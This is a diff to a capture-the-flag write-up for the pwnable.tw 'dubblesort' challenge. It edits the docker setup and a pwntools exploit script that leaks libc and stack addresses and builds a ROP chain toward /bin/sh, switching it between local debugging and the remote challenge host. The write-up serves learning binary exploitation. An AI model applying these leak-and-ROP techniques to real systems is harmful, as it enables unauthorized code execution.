@@ -984,7 +984,7 @@ Otherwise, spawned processes within the docker image were treated as root's.
 After building the image, I've created and runned the container:
 
 ```bash
-sudo docker run --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --name xenial ubuntu-dubblesort
+sudo docker run -p 9090:9090 --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --name xenial ubuntu-dubblesort
 ```
 
 That way, **we do not use patchelf at all**, hence - running the original binary, with its original libc, and an adequate `ld`! \
@@ -1022,13 +1022,9 @@ HOST = 'chall.pwnable.tw'
 PORT = 10101
 context.arch='i386'
 BINARY = './dubblesort'
-LIBC = './libc_32.so.6'
+LIBC = './libc.so.6'
+LD = './ld-2.23.so'
 GDB_SCRIPT = '''
-b *main+0x85
-commands
-    p "reading size"
-end
-
 c
 '''
 
@@ -1049,11 +1045,12 @@ BIN_SH:
 OFFSET_TO_BIN_SH = 0x0e
 
 # Constants
-IS_DEBUG = False 
-IS_REMOTE = True
+IS_DEBUG = True
+IS_REMOTE = False
 
 # Offsets
-NAME_LEAK = 0x1
+NAME_LEAK = 0x4 if IS_DEBUG else 0x1
+
 
 # Addresses
 libc_rop = ROP(LIBC)
@@ -1104,6 +1101,10 @@ def getLeaks(p):
     stack_leak = recvPointer(p)
     log.info(f'stack_leak: {hex(stack_leak)}')
     
+    # for _ in range(0x40):
+    #     leak = recvPointer(p)
+    #     log.info(f'leak: {hex(leak)}')
+
     p.recvuntil(b',How many numbers do you what to sort :')
     return libc_leak, stack_leak
 
@@ -1113,12 +1114,14 @@ def exploit(p):
 
 def main():
     if IS_DEBUG:
-        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+        p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
+        # pid = int(process('pgrep -f "./dubblesort"', shell=True).readline()[:-1])
+        # p = gdb.attach(pid, gdbscript=GDB_SCRIPT)
     else:
         if IS_REMOTE:
             p = remote(HOST, PORT)
         else:
-            p = process(BINARY)
+            p = process([LD, BINARY], env={"LD_PRELOAD": LIBC})
 
     exploit(p)
 
